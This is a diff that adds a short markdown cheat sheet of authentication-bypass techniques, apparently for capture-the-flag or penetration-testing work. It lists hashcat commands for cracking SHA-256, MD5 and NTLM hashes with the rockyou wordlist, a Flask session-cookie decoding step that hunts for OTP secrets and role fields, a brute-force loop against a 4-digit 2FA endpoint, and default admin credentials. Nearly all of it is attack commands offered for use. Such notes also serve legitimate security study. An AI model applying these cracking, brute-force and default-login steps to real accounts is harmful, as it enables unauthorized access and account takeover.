@@ -1,0 +1,26 @@
+# Auth Bypass & 2FA Payloads
+
+## Unsalted Fast-Hash Cracking (do offline first)
+# SHA-256 (64 hex chars)
+echo '<hash>' > hash.txt
+hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
+# MD5 (32 hex chars)
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+# NTLM (Windows)
+hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
+
+## Flask Session Cookie (signed, NOT encrypted)
+# Format: payload.timestamp.signature  (payload = base64url JSON; zlib-compressed if starts with '.')
+python3 scripts/flask_session_decoder.py '<cookie>'
+# OTP/secret keys to look for in the payload: otp, otp_secret, code, otp_code, token, role, admin
+
+## OTP / 2FA Brute Force (only if no rate limit)
+# 4-digit OTP space: 1000-9999 (9000 values)
+for otp in range(1000, 10000):
+    POST /two_fa  data={otp}
+# 6-digit OTP space: 000000-999999
+
+## Weak / Default Credentials
+admin:admin
+admin:password
+admin:admin123
